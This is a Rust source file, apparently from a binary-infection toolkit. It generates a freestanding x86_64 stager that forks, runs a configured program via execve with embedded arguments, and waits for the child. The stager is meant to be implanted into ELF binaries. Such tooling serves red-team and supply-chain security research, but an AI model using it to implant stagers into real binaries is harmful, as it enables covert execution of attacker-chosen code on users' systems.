#![allow(non_upper_case_globals)]

use crate::codegen::rust;
use crate::errors::*;
use crate::infect::elf_fwd_stdin::Infect;
use std::path::Path;

const SIGCHLD: u64 = 17;
const __NR_fork: u64 = 57;
const __NR_execve: u64 = 59;
const __NR_exit: u64 = 60;
const __NR_wait4: u64 = 61;

fn gen_args_src(args: &[String]) -> Result<String> {
    let mut s = String::new();
    for arg in args {
        s.push_str("unsafe { CStr::from_bytes_with_nul_unchecked(b\"");
        rust::escape(arg.as_bytes(), &mut s)?;
        s.push_str("\").as_ptr() as *const u8 },\n");
    }
    Ok(s)
}

pub async fn infect(bin: &Path, config: &Infect, _orig: &[u8]) -> Result<()> {
    let exec_path = config.exec_path();
    let args = config.args(exec_path);

    let target = Some("x86_64-unknown-none");
    let mut compiler = rust::Compiler::spawn(bin, target).await?;

    info!(
        "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
        exec_path,
        args[0],
        &args[1..],
    );

    let mut exec_path_escaped = String::new();
    rust::escape(exec_path.as_bytes(), &mut exec_path_escaped)?;

    let mut arg0_escaped = String::new();
    rust::escape(args[0].as_bytes(), &mut arg0_escaped)?;

    let args_src = gen_args_src(&args)?;

    compiler
        .add_lines(&[
            "#![no_std]\n",
            "#![no_main]\n",
            // TODO: naked functions are not stable yet
            "#![feature(naked_functions)]\n",
            "use core::arch::asm;\n",
            "use core::ffi::CStr;\n",
            "use core::ptr;\n",
        ])
        .await?;

    // add panic handler
    compiler
        .add_lines(&[
            "#[panic_handler]\n",
            "fn panic(__info: &core::panic::PanicInfo) -> ! {\n",
            "exit(1)\n",
            "}\n",
        ])
        .await?;

    // generate exit function
    compiler
        .add_lines(&[
            "fn exit(code: i32) -> ! {\n",
            &format!("unsafe {{ asm!(\"syscall\", in(\"rax\") {}, in(\"rdi\") code, options(noreturn)) }}\n", __NR_exit),
            "}\n",
        ])
        .await?;

    // generate execve function
    compiler
        .add_lines(&[
            "fn execve(prog: *const u8, argv: *const *const u8, envp: *const *const u8) -> u64 {\n",
        ])
        .await?;
    compiler
        .syscall3_readonly("u64", __NR_execve, "prog", "argv", "envp")
        .await?;
    compiler.add_lines(&["}\n"]).await?;

    // generate fork function
    compiler.add_lines(&["fn fork() -> u64 {\n"]).await?;
    let zero = "ptr::null_mut::<u64>()";
    compiler
        .syscall5_readonly(
            "u64",
            __NR_fork,
            &SIGCHLD.to_string(),
            zero,
            zero,
            zero,
            zero,
        )
        .await?;
    compiler.add_lines(&["}\n"]).await?;

    // generate wait4 function
    compiler.add_lines(&["fn wait4(pid: u64, status: *const i32, options: i32, rusage: *const core::ffi::c_void) -> i32 {\n"]).await?;
    compiler
        .syscall4_readonly("i32", __NR_wait4, "pid", "status", "options", "rusage")
        .await?;
    compiler.add_lines(&["}\n"]).await?;

    // generate entry point
    compiler
        .add_lines(&[
            "#[no_mangle]\n",
            "#[naked]\n",
            "pub unsafe extern \"C\" fn _start() -> ! {\n",
            "asm!(\"mov rdi, rsp\", \"call main\", options(noreturn))\n",
            "}\n",
        ])
        .await?;

    // generate main
    compiler
        .add_lines(&[
            "#[no_mangle]\n",
            "pub unsafe fn main(stack_top: *const u8) -> ! {\n",
            "let _argc = *(stack_top as *const u64);\n",
            "let pid = fork();\n",
            "if pid == 0 {\n",
            // setup exec of child process
            &format!("let prog = b\"{exec_path_escaped}\\x00\";\n"),
            "let prog = unsafe { CStr::from_bytes_with_nul_unchecked(prog) };\n",
            "let argv = [\n",
            &args_src,
            "ptr::null::<u8>()];\n",
            "let envp = [ptr::null::<u8>()];\n",
            "execve(prog.as_ptr() as *const u8, argv.as_ptr(), envp.as_ptr());\n",
            // exit of exec failed
            "exit(1);\n",
            "} else {\n",
            // wait for child process
            "let wstatus: i32 = 0;\n",
            "loop {\n",
            "if wait4(pid, &wstatus as *const i32, 0, ptr::null()) == -1 { break }\n",
            "if (wstatus & 0x7f) == 0 || ((((wstatus & 0x7f) + 1) >> 1) <= 0) { break }\n",
            "}\n",
            // exit after child process was cleaned up
            "exit(0);\n",
            "}\n",
            "}\n",
        ])
        .await?;

    let mut pending = compiler.done();
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    Ok(())
}
